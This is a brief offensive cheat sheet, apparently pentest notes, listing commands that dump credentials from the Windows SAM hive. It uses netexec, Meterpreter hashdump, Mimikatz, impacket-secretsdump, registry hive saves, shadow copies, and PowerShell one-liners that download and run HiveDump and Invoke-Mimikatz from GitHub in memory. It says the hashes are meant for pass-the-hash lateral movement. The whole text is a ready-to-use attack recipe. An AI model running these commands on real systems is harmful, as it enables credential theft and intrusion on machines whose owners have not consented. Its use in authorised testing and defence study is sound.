# Extract Credentials from SAM

## Tools: CrackMapExec/Netexec , Meterpreter , Mimikatz , impacket-secretsdump , reg.py , vss shadow copies

#### 1) CrackMapExec/Netexec

    netexec smb IP_RANGE -u USER -p 'PASSWORD --sam

#### 2) Meterpreter

    hashdump

#### 3) Mimikatz

    mimikatz "privilege::debug" "lsadump::sam" "exit"

#### 4) Secretsdump

    impacket-secretsdump DOMAIN/USER:PASSWORD@IP

#### 5) Reg.py

    reg.py DOMAIN/USER:PASSWORD@IP backup -o '\\SMB_IP\share'

    impacket-secretsdump -security SECURITY_FILE -system SYSTEM_FILE LOCAL

#### 6) Shadow Copies (vss)

    diskshadow list shadows all

    mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\Harddisk VolumeShadowCopy1\

#### 7) SAM , SYSTEM and SECURITY hives backup copies

    reg save HKLM\SAM SAM_COPY

    reg save HKLM\SECURITY SECURITY_COPY

    reg save HKLM\SYSTEM SYSTEM_FILE

    impacket-secretsdump -system SYSTEM -sam SAM LOCAL

#### 8) HiveDump

##### Load into memory

    iex (iwr -UseBasicParsing https://raw.githubusercontent.com/tmenochet/PowerDump/master/HiveDump.ps1)

##### Dump

    Invoke-HiveDump

#### 9) Mimikatz

##### Load into memory

    IEX (IWR -UseBasicParsing "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1")

##### Dump from SAM and SYSTEM. Ensure files are in the current working directory

    Invoke-Mimikatz -command "lsadump::sam /system:SYSTEM /sam:SAM"

##### Dump against the live hive files

    Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'


### With dumping the SAM hive, we dump NTLM hashes to perform Pass-the-Hash attacks (Lateral Movement)
